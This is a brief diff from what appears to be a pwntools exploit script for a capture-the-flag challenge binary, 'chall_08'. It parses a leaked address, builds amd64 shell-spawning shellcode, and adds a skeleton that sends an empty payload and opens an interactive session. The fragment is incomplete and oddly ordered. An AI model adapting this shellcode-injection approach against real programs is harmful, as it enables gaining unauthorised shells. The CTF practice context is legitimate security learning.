@@ -28,3 +28,12 @@ re.findall(b"([a-f0-9]{8,16})",resp)[0]
 shellcodeAddr = p64(int(re.findall(b"([a-f0-9]{8,16})",resp)[0],16))
 shellcode = asm(shellcraft.amd64.sh())
 
+from pwn import *
+p = process ("./chall_08")
+context.arch = "amd64" 
+elf = ELF("./chall_08") 
+
+payload = b''
+p.sendline(payload)
+p.interactive()
+ls
